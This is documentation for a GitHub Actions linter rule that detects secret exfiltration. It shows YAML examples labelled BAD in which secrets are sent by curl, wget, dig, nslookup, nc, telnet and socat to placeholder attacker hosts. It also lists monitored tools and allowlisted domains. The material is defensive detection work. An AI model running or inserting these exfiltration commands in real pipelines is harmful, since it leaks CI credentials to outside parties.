# Secret Exfiltration Rule

## Overview

The `secret-exfiltration` rule detects patterns where GitHub Actions secrets may be exfiltrated to external services via network commands. This helps identify potential security vulnerabilities where secrets could be stolen by malicious actors.

## Rule ID

`secret-exfiltration`

## Severity Levels

- **Critical**: Network commands that actively send data (e.g., `curl -X POST`, `wget --post-data`) with secrets
- **High**: Network commands that may expose secrets (e.g., `curl` with secrets in headers, DNS exfiltration)

## Detected Patterns

### 1. Direct Secret Exfiltration via HTTP

Secrets passed directly to network commands that send data to external URLs:

```yaml
# BAD: curl with secret in POST data
- run: |
    curl -X POST https://attacker.com/collect \
      -d "token=${{ secrets.API_TOKEN }}"

# BAD: Secret in HTTP header
- run: |
    curl -H "Authorization: Bearer ${{ secrets.AUTH_TOKEN }}" \
      https://unknown-server.com/api

# BAD: wget with POST data
- run: |
    wget --post-data "key=${{ secrets.SECRET_KEY }}" \
      https://malicious.site/exfil
```

### 2. DNS Exfiltration

Secrets embedded in DNS queries for data exfiltration:

```yaml
# BAD: dig with secret in subdomain
- run: dig ${{ secrets.TOKEN }}.attacker.com

# BAD: nslookup exfiltration
- run: nslookup ${{ secrets.SECRET }}.evil.com

# BAD: host command exfiltration
- run: host ${{ secrets.API_KEY }}.malicious.com
```

### 3. Raw Socket Exfiltration

Secrets piped to low-level network tools:

```yaml
# BAD: netcat exfiltration
- run: echo "${{ secrets.PASSWORD }}" | nc attacker.com 443

# BAD: telnet exfiltration
- run: echo "${{ secrets.CREDENTIALS }}" | telnet evil.com 23

# BAD: socat exfiltration
- run: echo "${{ secrets.TOKEN }}" | socat - TCP:attacker.com:8080
```

### 4. Environment Variable Leak

Secrets passed via environment variables to network commands:

```yaml
# BAD: Secret leaked via env var
- env:
    MY_SECRET: ${{ secrets.SENSITIVE_DATA }}
  run: |
    curl -X POST https://attacker.com/collect \
      -d "data=$MY_SECRET"
```

## Safe Patterns (Not Flagged)

The rule recognizes legitimate use cases and does NOT flag:

### Package Publishing

```yaml
# GOOD: npm publish
- run: npm publish --access public
  env:
    NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

# GOOD: docker login
- run: docker login ghcr.io -u ${{ github.actor }} -p ${{ secrets.GITHUB_TOKEN }}

# GOOD: twine upload
- run: twine upload dist/*
  env:
    TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}
```

### Cloud CLI Authentication

```yaml
# GOOD: AWS CLI
- run: aws configure set aws_access_key_id ${{ secrets.AWS_ACCESS_KEY_ID }}

# GOOD: gcloud auth
- run: gcloud auth activate-service-account --key-file=key.json

# GOOD: Azure login
- run: az login --service-principal -u ${{ secrets.AZURE_CLIENT_ID }}
```

### Trusted API Endpoints

```yaml
# GOOD: GitHub API
- run: |
    curl -X POST https://api.github.com/repos/owner/repo/releases \
      -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"

# GOOD: Slack webhook
- run: |
    curl -X POST https://hooks.slack.com/services/xxx/yyy/zzz \
      -d '{"text": "Build completed!"}'

# GOOD: Codecov
- run: codecov -t ${{ secrets.CODECOV_TOKEN }}
```

### Infrastructure Tools

```yaml
# GOOD: Terraform
- run: terraform login app.terraform.io
  env:
    TF_TOKEN_app_terraform_io: ${{ secrets.TF_API_TOKEN }}

# GOOD: Vault
- run: vault login -method=token token=${{ secrets.VAULT_TOKEN }}
```

### Git Operations

```yaml
# GOOD: git push
- run: git push origin main
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

# GOOD: gh CLI
- run: gh pr create --title "PR title" --body "PR body"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

## Network Commands Monitored

| Command | Risk Level | Common Data Flags |
|---------|------------|-------------------|
| `curl` | High | `-d`, `--data`, `--data-raw`, `-F`, `-H` |
| `wget` | High | `--post-data`, `--header` |
| `nc`/`netcat`/`ncat` | High | (piped input) |
| `telnet` | High | (piped input) |
| `socat` | High | (piped input) |
| `dig` | High | (DNS exfiltration) |
| `nslookup` | High | (DNS exfiltration) |
| `host` | High | (DNS exfiltration) |

## Trusted Domains (Allowlisted)

The following domains are considered trusted and won't trigger alerts:

- GitHub: `api.github.com`, `github.com`, `githubusercontent.com`
- Package Registries: `registry.npmjs.org`, `pypi.org`, `rubygems.org`, `crates.io`, `nuget.org`
- Container Registries: `ghcr.io`, `docker.io`, `gcr.io`, `ecr.aws`, `azurecr.io`
- CI/CD Services: `codecov.io`, `coveralls.io`, `circleci.com`, `travis-ci.com`
- Monitoring: `sentry.io`, `datadoghq.com`, `newrelic.com`
- Notifications: `slack.com/api`, `hooks.slack.com`, `discord.com/api`, `api.telegram.org`
- Security Tools: `snyk.io`, `sonarcloud.io`
- Infrastructure: `app.terraform.io`, `vault.*`, `hashicorp`
- Artifact Management: `jfrog.io`, `artifactory`, `nexus`, `sonatype.org`

## Why This Rule Matters

1. **Data Theft**: Attackers with write access to workflows can add steps that exfiltrate secrets to their servers
2. **Supply Chain Attacks**: Compromised dependencies or actions could exfiltrate secrets
3. **Insider Threats**: Malicious contributors could steal secrets via workflow modifications
4. **DNS Tunneling**: Even firewalled environments may allow DNS queries, enabling data exfiltration

## Remediation

1. **Review all network commands** that use secrets
2. **Verify destination URLs** are trusted and necessary
3. **Use environment variables** instead of inline secrets when possible
4. **Limit secret scope** using job-level or step-level secrets
5. **Enable audit logging** to track secret access
6. **Use OIDC** instead of long-lived credentials where possible

## Example Fix

Before (Vulnerable):
```yaml
- run: |
    curl -X POST https://analytics.company.com/track \
      -d "api_key=${{ secrets.ANALYTICS_KEY }}"
```

After (Safe):
```yaml
# Option 1: Use a dedicated action
- uses: company/analytics-action@v1
  with:
    api-key: ${{ secrets.ANALYTICS_KEY }}

# Option 2: Use environment variable and validate URL
- env:
    ANALYTICS_KEY: ${{ secrets.ANALYTICS_KEY }}
  run: |
    # Use a well-known analytics service
    curl -X POST https://api.segment.io/v1/track \
      -H "Authorization: Bearer $ANALYTICS_KEY"
```

## Related Rules

- `secret-exposure`: Detects excessive secret exposure patterns like `toJSON(secrets)`
- `unmasked-secret-exposure`: Detects derived secrets that aren't automatically masked
- `credential-rule`: Detects hardcoded credentials in workflows

## References

- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Encrypted Secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/encrypted-secrets)
- [DNS Tunneling Attacks](https://www.infoblox.com/glossary/dns-tunneling/)
